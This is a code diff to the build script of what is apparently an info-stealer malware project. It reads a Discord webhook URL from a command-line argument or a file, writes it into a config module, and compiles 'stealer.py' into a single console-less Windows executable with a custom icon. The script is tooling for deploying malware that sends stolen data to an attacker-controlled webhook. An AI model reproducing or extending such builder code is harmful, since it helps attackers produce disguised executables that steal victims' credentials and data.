@@ -1,3 +1,4 @@
+import argparse
 import copy
 import os
 import requests
@@ -5,24 +6,24 @@ import requests
 cmd = "python -m nuitka --standalone --onefile --disable-console --windows-icon-from-ico=icon.ico stealer.py"
 
 if __name__ == "__main__":
-    with open("utils.py", "r") as file:
-        utils = file.read()
 
-    backup = copy.copy(utils)
-    with open("webhook.txt", "r") as file:
-        webhook = file.read()
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--webhook", help="The url of your Discord webhook", type=str)
+    args = parser.parse_args()
 
+    if len(args.webhook) == 0:
+        with open("webhook.txt", "r") as file:
+            webhook = file.read()
+    else:
+        webhook = args.webhook
+
+    print(f"Webhook {webhook}")
     try:
         if requests.get(webhook).status_code == 200:
-            # Open the file in write mode
-            with open("my_file.txt", "w") as file:
-                # Write the modified string to the file
-                utils.replace("WEBHOOK_1", webhook)
-                with open("utils.py", "w") as file_utils:
-                    file_utils.write(utils)
-                    os.system(cmd)
-                with open("utils.py", "w") as file_utils:
-                    file_utils.write(backup)
+
+            with open("webhook.py.py", "w") as file_utils:
+                file_utils.write(f"WEBHOOK = '{webhook}'")
+            os.system(cmd)
         else:
             print("Webhook is incorrect.")
     except Exception as e:
